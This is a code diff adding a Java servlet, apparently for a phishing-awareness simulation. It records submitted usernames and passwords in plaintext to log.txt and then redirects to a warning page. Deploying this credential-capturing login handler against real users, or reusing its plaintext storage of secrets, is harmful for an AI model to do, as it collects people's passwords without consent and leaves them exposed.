@@ -1,0 +1,28 @@
+package com.example;
+
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.PrintWriter;
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+@WebServlet("/LoginServlet")
+public class LoginServlet extends HttpServlet {
+    private static final long serialVersionUID = 1L;
+
+    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+        String username = request.getParameter("username");
+        String password = request.getParameter("password");
+
+        // Simpan ke file (hanya simulasi)
+        try (FileWriter writer = new FileWriter("log.txt", true)) {
+            writer.write("Username: " + username + " | Password: " + password + "\n");
+        }
+
+        // Redirect ke halaman peringatan
+        response.sendRedirect("warning.jsp");
+    }
+}
